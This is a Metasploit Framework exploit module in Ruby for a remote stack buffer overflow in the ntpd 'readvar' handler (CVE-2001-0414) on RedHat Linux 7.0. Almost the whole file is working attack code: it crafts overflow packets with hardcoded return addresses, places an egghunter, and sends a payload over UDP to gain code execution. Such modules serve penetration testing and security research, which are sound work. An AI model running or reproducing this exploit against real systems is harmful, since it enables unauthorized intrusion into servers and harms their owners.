##
# $Id: ntp_overflow.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NTP daemon readvar Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow in the
				ntpd and xntpd service. By sending an overly long 'readvar'
				request it is possible to execute code remotely. As the stack
				is corrupted, this module uses the Egghunter technique.
			},
			'Author'         => 'patrick',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
						[ 'CVE', '2001-0414' ],
						[ 'OSVDB', '805' ],
						[ 'BID', '2540' ],
						[ 'US-CERT-VU', '970472' ],
				],
			'Payload'        =>
				{
					'Space'    => 220,
					'BadChars' => "\x00\x01\x02\x16,=",
					'StackAdjustment' => -3500,
					'PrependEncoder' => Metasm::Shellcode.assemble(Metasm::Ia32.new, "xor eax,eax mov al,27 int 0x80").encode_string, # alarm(0)
					'Compat'   =>
					{
						'ConnectionType' => '-reverse',
					},
				},
			'Platform'       => [ 'linux' ],
			'Arch'		 => [ ARCH_X86 ],
			'Targets'        =>
				[
						[ 'RedHat Linux 7.0 ntpd 4.0.99j', 		{ 'Ret' => 0xbffffbb0 } ],
						[ 'RedHat Linux 7.0 ntpd 4.0.99j w/debug', 	{ 'Ret' => 0xbffff980 } ],
						[ 'RedHat Linux 7.0 ntpd 4.0.99k', 		{ 'Ret' => 0xbffffbb0 } ],
						#[ 'FreeBSD 4.2-STABLE', 			{ 'Ret' => 0xbfbff8bc } ],
						[ 'Debugging', 					{ 'Ret' => 0xdeadbeef } ],
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Apr 04 2001',
			'DefaultTarget' => 0))

		register_options([Opt::RPORT(123)], self.class)
	end

	def exploit

		hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		egg     = hunter[1]

		connect_udp

		pkt1 = "\x16\x02\x00\x01\x00\x00\x00\x00\x00\x00\x016stratum="
		pkt2 = "\x16\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00"

		sploit =  pkt1 + make_nops(512 - pkt1.length)
		sploit[(220 + pkt1.length), 4] = [target['Ret']].pack('V')
		sploit[(224 + pkt1.length), hunter[0].length] = hunter[0]

		print_status("Trying target #{target.name}...")

		print_status("Sending hunter")
		udp_sock.put(sploit)
		select(nil,nil,nil,0.5)

		print_status("Sending payload")
		udp_sock.put(pkt1 + egg)
		select(nil,nil,nil,0.5)

		print_status("Calling overflow trigger")
		udp_sock.put(pkt2)
		select(nil,nil,nil,0.5)

		handler
		disconnect_udp

	end

end